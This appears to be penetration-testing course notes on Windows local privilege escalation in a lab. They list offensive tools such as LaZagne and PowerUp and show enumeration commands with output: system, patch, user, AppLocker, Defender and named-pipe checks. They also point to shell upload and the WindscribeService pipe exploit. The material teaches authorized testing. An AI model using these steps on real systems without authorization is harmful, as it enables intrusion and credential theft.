## Useful Tools


|Tool|Description|
|---|---|
|[Seatbelt](https://github.com/GhostPack/Seatbelt)|C# project for performing a wide variety of local privilege escalation checks|
|[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)|WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)|
|[PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)|PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found|
|[SharpUp](https://github.com/GhostPack/SharpUp)|C# version of PowerUp|
|[JAWS](https://github.com/411Hall/JAWS)|PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0|
|[SessionGopher](https://github.com/Arvanaghi/SessionGopher)|SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information|
|[Watson](https://github.com/rasta-mouse/Watson)|Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.|
|[LaZagne](https://github.com/AlessandroZ/LaZagne)|Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more|
|[Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)|WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported|
|[Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)|We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)|

We can also find pre-compiled binaries of `Seatbelt` and `SharpUp` [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries), and standalone binaries of `LaZagne` [here](https://github.com/AlessandroZ/LaZagne/releases/). It is recommended that we always compile our tools from the source if using them in a client environment.

# Situational Awareness

When placed in any situation, whether in our day-to-day lives or during a project such as a network penetration test, it is always important to orient ourselves in space and time. We cannot function and react effectively without an understanding of our current surroundings. We require this information to make informed decisions about our next steps to operate proactively instead of reactively.

## Network Information

```cmd
C:\htb> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WINLPE-SRV01
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-C5-4B
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::f055:fefd:b1b:9919%9(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.20.56(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.20.1
   DHCPv6 IAID . . . . . . . . . . . : 151015510
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-27-ED-DB-68-00-50-56-B9-90-94
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-90-94
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
```

## ARP Table

```cmd
C:\htb> arp -a

Interface: 10.129.43.8 --- 0x4
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-4d-df     dynamic
  10.129.43.12          00-50-56-b9-da-ad     dynamic
  10.129.43.13          00-50-56-b9-5b-9f     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
  224.0.0.253           01-00-5e-00-00-fd     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 192.168.20.56 --- 0x9
  Internet Address      Physical Address      Type
  192.168.20.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

## Routing Table

```cmd
C:\htb> route print

===========================================================================
Interface List
  9...00 50 56 b9 c5 4b ......vmxnet3 Ethernet Adapter
  4...00 50 56 b9 90 94 ......Intel(R) 82574L Gigabit Network Connection
  1...........................Software Loopback Interface 1
  3...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
  5...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.129.0.1      10.129.43.8     25
          0.0.0.0          0.0.0.0     192.168.20.1    192.168.20.56    271
       10.129.0.0      255.255.0.0         On-link       10.129.43.8    281
      10.129.43.8  255.255.255.255         On-link       10.129.43.8    281
   10.129.255.255  255.255.255.255         On-link       10.129.43.8    281
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     192.168.20.0    255.255.255.0         On-link     192.168.20.56    271
    192.168.20.56  255.255.255.255         On-link     192.168.20.56    271
   192.168.20.255  255.255.255.255         On-link     192.168.20.56    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link       10.129.43.8    281
        224.0.0.0        240.0.0.0         On-link     192.168.20.56    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link       10.129.43.8    281
  255.255.255.255  255.255.255.255         On-link     192.168.20.56    271
===========================================================================
```

## Enumerating Protections

We can use the [GetAppLockerPolicy](https://docs.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps) cmdlet to enumerate the local, effective (enforced), and domain AppLocker policies. This will help us see what `binaries` or `file types` may be `blocked` and whether we will have to perform some sort of AppLocker bypass either during our enumeration or before running a tool or technique to escalate privileges.

Some EDR tools detect on or even block usage of common binaries such as `net.exe`, `tasklist`, etc. Organizations may restrict what binaries a user can run or immediately flag suspicious activities, such as an accountant's machine showing specific binaries being run via cmd.exe.

## Windows Defender Status

```powershell
PS C:\htb> Get-MpComputerStatus

AMEngineVersion                 : 1.1.17900.7
AMProductVersion                : 4.10.14393.2248
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.2248
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM
AntispywareSignatureVersion     : 1.333.1470.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 3/28/2021 2:59:12 AM
AntivirusSignatureVersion       : 1.333.1470.0
BehaviorMonitorEnabled          : False
ComputerID                      : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
PSComputerName                  :
```

## List AppLocker Rules

```powershell
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
```

## Test AppLocker Policy

```powershell
PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe
```

# Initial Enumeration

Enumeration is the key to privilege escalation. When we gain initial shell access to the host, it is vital to gain situational awareness and uncover details relating to the OS version, patch level, installed software, current privileges, group memberships, and more. Let's walk through some of the key data points that we should be reviewing after gaining initial access.

## System Information

Using the [tasklist](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) command to look at running processes will give us a better idea of what applications are currently running on the system.

```powershell
C:\htb> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       316 N/A
csrss.exe                      424 N/A
wininit.exe                    528 N/A
csrss.exe                      540 N/A
winlogon.exe                   612 N/A
services.exe                   664 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 BrokerInfrastructure, DcomLaunch, LSM,
                                   PlugPlay, Power, SystemEventsBroker
svchost.exe                    836 RpcEptMapper, RpcSs
LogonUI.exe                    952 N/A
dwm.exe                        964 N/A
svchost.exe                    972 TermService
svchost.exe                   1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc
svchost.exe                    364 NcbService, PcaSvc, ScDeviceEnum, TrkWks,
                                   UALSVC, UmRdpService
<...SNIP...>

FileZilla Server Interfac     5628 N/A
jusched.exe                   5796 N/A
cmd.exe                       4132 N/A
conhost.exe                   4136 N/A
TrustedInstaller.exe          1120 TrustedInstaller
TiWorker.exe                  1816 N/A
WmiApSrv.exe                  2428 wmiApSrv
tasklist.exe                  3596 N/A
```

It is essential to become familiar with standard Windows processes such as [Session Manager Subsystem (smss.exe)](https://en.wikipedia.org/wiki/Session_Manager_Subsystem), [Client Server Runtime Subsystem (csrss.exe)](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem), [WinLogon (winlogon.exe)](https://en.wikipedia.org/wiki/Winlogon), [Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service), and [Service Host (svchost.exe)](https://en.wikipedia.org/wiki/Svchost.exe), among others and the services associated with them. Being able to spot standard processes/services quickly will help speed up our enumeration and enable us to hone in on non-standard processes/services, which may open up a privilege escalation path.

## Display All Environment Variables

```powershell
C:\htb> set

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=WINLPE-SRV01
ComSpec=C:\Windows\system32\cmd.exe
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Administrator\AppData\Local
LOGONSERVER=\\WINLPE-SRV01
NUMBER_OF_PROCESSORS=6
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=3100
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
USERDOMAIN=WINLPE-SRV01
USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator
windir=C:\Windows 
```

## View Detailed Configuration Information

The `systeminfo` command will show if the box has been patched recently and if it is a VM. If the box has not been patched recently, getting administrator-level access may be as simple as running a known exploit. 

Google the KBs installed under [HotFixes](https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix) to get an idea of when the box has been patched

```powershell
C:\htb> systeminfo

Host Name:                 WINLPE-SRV01
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30000-00299-AA303
Original Install Date:     3/24/2021, 3:46:32 PM
System Boot Time:          3/25/2021, 9:24:36 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              3 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [03]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system

<SNIP>

Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WINLPE-SRV01
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB5001078
                           [03]: KB4103723
```


## Patches and Updates

If `systeminfo` doesn't display hotfixes, they may be queriable with [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) using the WMI-Command binary with [QFE (Quick Fix Engineering)](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering) to display patches.

```powershell
C:\htb> wmic qfe

Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016
https://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update               KB5001078               NT AUTHORITY\SYSTEM  3/25/2021
http://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update               KB4103723               NT AUTHORITY\SYSTEM  3/25/2021
```

## Installed Programs

WMI can also be used to display installed software. This information can often guide us towards hard-to-find exploits. Is `FileZilla`/`Putty`/etc installed? Run `LaZagne` to check if stored credentials for those applications are installed. Also, some programs may be installed and running as a service that is vulnerable.

```powershell
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
Java 8 Update 231 (64-bit)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
Java Auto Updater

<SNIP>
```

```powershell
PS C:\htb> Get-WmiObject -Class Win32_Product |  select Name, Version

Name                                                                    Version
----                                                                    -------
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
Microsoft OLE DB Driver for SQL Server                                  18.3.0.0
Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219             10.0.40219
Microsoft Help Viewer 2.3                                               2.3.28107
Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219             10.0.40219
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005              12.0.21005
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005           12.0.21005
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29914          14.28.29914
Microsoft ODBC Driver 13 for SQL Server                                 13.2.5026.0
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
SQL Server 2016 Database Engine Services                                13.2.5026.0
SQL Server Management Studio for Reporting Services                     15.0.18369.0
Microsoft SQL Server 2008 Setup Support Files                           10.3.5500.0
SSMS Post Install Tasks                                                 15.0.18369.0
Microsoft VSS Writer for SQL Server 2016                                13.2.5026.0
Java 8 Update 231 (64-bit)                                              8.0.2310.11
Browser for SQL Server 2016                                             13.2.5026.0
Integration Services                                                    15.0.2000.130

<SNIP>
```

## Display Running Processes

```powershell
PS C:\htb> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1096
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3520
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       968
<...SNIP...>
```

## Logged-In Users

```powershell
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM
```

## Current User Privileges

```powershell
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## Current User Group Information

```powershell
C:\htb> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

## Get All Users

```powershell
C:\htb> net user

User accounts for \\WINLPE-SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
helpdesk                 htb-student              jordan
sarah                    secsvc
The command completed successfully.
```

## Get All Groups

```powershell
C:\htb> net localgroup

Aliases for \\WINLPE-SRV01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.
```

## Details About a Group

```powershell
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
helpdesk
sarah
secsvc
The command completed successfully. 
```

## Get Password Policy & Other Account Information

```powershell
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

# Communication with Processes

One of the best places to look for privilege escalation is the processes that are running on the system. Even if a process is not running as an administrator, it may lead to additional privileges.

The most common example is discovering a web server like IIS or XAMPP running on the box, placing an `aspx/php` shell on the box, and gaining a shell as the user running the web server. Generally, this is not an administrator but will often have the `SeImpersonate` token.

In Windows, [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens) are used to describe the security context (security attributes or rules) of a process or thread. The token includes information about the user account's identity and privileges related to a specific process or thread.

## Access Tokens

In Windows, [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens) are used to describe the security context (security attributes or rules) of a process or thread. The token includes information about the user account's identity and privileges related to a specific process or thread.

## Enumerating Network Services

```powershell
C:\htb> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       3812
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       936
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5044
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       528
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       996
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1260
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2008
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       600
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       1888
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       616
  TCP    10.129.43.8:139        0.0.0.0:0              LISTENING       4
  TCP    10.129.43.8:3389       10.10.14.3:63191       ESTABLISHED     936
  TCP    10.129.43.8:49671      40.67.251.132:443      ESTABLISHED     1260
  TCP    10.129.43.8:49773      52.37.190.150:443      ESTABLISHED     2608
  TCP    10.129.43.8:51580      40.67.251.132:443      ESTABLISHED     3808
  TCP    10.129.43.8:54267      40.67.254.36:443       ESTABLISHED     3808
  TCP    10.129.43.8:54268      40.67.254.36:443       ESTABLISHED     1260
  TCP    10.129.43.8:54269      64.233.184.189:443     ESTABLISHED     2608
  TCP    10.129.43.8:54273      216.58.210.195:443     ESTABLISHED     2608
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       3812
```

```bash
C:\Users\htb-student>tasklist /svc  | findstr 1744
FileZilla Server.exe          1744 FileZilla Server
```

The main thing to look for with Active Network Connections are entries listening on loopback addresses (`127.0.0.1` and `::1`) that are not listening on the IP Address (`10.129.43.8`) or broadcast (`0.0.0.0`, `::/0`). 

The reason for this is network sockets on localhost are often insecure due to the thought that "they aren't accessible to the network." 

One of the best examples of this type of privilege escalation is the `Splunk Universal Forwarder`, installed on endpoints to send logs into Splunk. The default configuration of Splunk did not have any authentication on the software and allowed anyone to deploy applications, which could lead to code execution.

## Named Pipes

The other way processes communicate with each other is through Named Pipes. Pipes are essentially files stored in memory that get cleared out after being read. Cobalt Strike uses Named Pipes for every command (excluding [BOF](https://www.cobaltstrike.com/help-beacon-object-files)). Essentially the workflow looks like this:

1. Beacon starts a named pipe of \.\pipe\msagent_12
2. Beacon starts a new process and injects command into that process directing output to \.\pipe\msagent_12
3. Server displays what was written into \.\pipe\msagent_12

## Listing Named Pipes with Pipelist

We can use the tool [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist) from the Sysinternals Suite to enumerate instances of named pipes.

```powershell
C:\htb> pipelist.exe /accepteula

PipeList v1.02 - Lists open named pipes
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               -1
lsass                                             4               -1
ntsvcs                                            3               -1
scerpc                                            3               -1
Winsock2\CatalogChangeListener-340-0              1                1
Winsock2\CatalogChangeListener-414-0              1                1
epmapper                                          3               -1
Winsock2\CatalogChangeListener-3ec-0              1                1
Winsock2\CatalogChangeListener-44c-0              1                1
LSM_API_service                                   3               -1
atsvc                                             3               -1
Winsock2\CatalogChangeListener-5e0-0              1                1
eventlog                                          3               -1
Winsock2\CatalogChangeListener-6a8-0              1                1
spoolss                                           3               -1
Winsock2\CatalogChangeListener-ec0-0              1                1
wkssvc                                            4               -1
trkwks                                            3               -1
vmware-usbarbpipe                                 5               -1
srvsvc                                            4               -1
ROUTER                                            3               -1
vmware-authdpipe                                  1                1
```

## Listing Named Pipes with PowerShell

```powershell
PS C:\htb>  gci \\.\pipe\


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 InitShutdown
------       12/31/1600   4:00 PM              4 lsass
------       12/31/1600   4:00 PM              3 ntsvcs
------       12/31/1600   4:00 PM              3 scerpc


    Directory: \\.\pipe\Winsock2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              1 Winsock2\CatalogChangeListener-34c-0


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 epmapper

<SNIP>
```

## Reviewing LSASS Named Pipe Permissions

```powershell
C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\lsass
  Untrusted Mandatory Level [No-Write-Up]
  RW Everyone
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW NT AUTHORITY\ANONYMOUS LOGON
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW APPLICATION PACKAGE AUTHORITY\Your Windows credentials
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

## Named Pipes Attack Example

Let's walk through an example of taking advantage of an exposed named pipe to escalate privileges. This [WindscribeService Named Pipe Privilege Escalation](https://www.exploit-db.com/exploits/48021) is a great example. Using `accesschk` we can search for all named pipes that allow write access with a command such as `accesschk.exe -w \pipe\* -v` and notice that the `WindscribeService` named pipe allows `READ` and `WRITE` access to the `Everyone` group, meaning all authenticated users.

Confirming with `accesschk` we see that the Everyone group does indeed have `FILE_ALL_ACCESS` (All possible access rights) over the pipe.

```powershell
C:\htb> accesschk.exe -accepteula -w \pipe\WindscribeService -v

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
```

```powershell
C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\lsass
  Untrusted Mandatory Level [No-Write-Up]
  RW Everyone
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW NT AUTHORITY\ANONYMOUS LOGON
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW APPLICATION PACKAGE AUTHORITY\Your Windows credentials
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
